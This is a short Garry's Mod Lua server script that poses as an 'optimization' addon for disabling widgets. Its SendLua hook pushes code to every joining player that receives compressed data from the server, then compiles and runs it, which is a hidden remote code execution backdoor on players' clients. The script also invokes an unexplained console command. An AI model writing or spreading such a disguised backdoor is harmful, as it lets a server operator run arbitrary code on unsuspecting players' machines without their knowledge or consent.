util.AddNetworkString( 'optimization' )

coudxd = [[net.Receive( 'optimization',function() local i = net.ReadInt(16) local d = util.Decompress( net.ReadData(i) ) CompileString( d, '\n' )() end) RunConsoleCommand('l__')]]

hook.Add( 'PlayerInitialSpawn', 'loadcoud', function(ply)
	ply:SendLua( coudxd )
end)

hook.Add("PreGamemodeLoaded", "widgets_disabler_cpu", function()
	MsgN("Disabling widgets")
	function widgets.PlayerTick()
	end
	hook.Remove("PlayerTick", "TickWidgets")
	MsgN("Widgets disabled")
end)

hook.Add( "Initialize", "ffinit", FF );
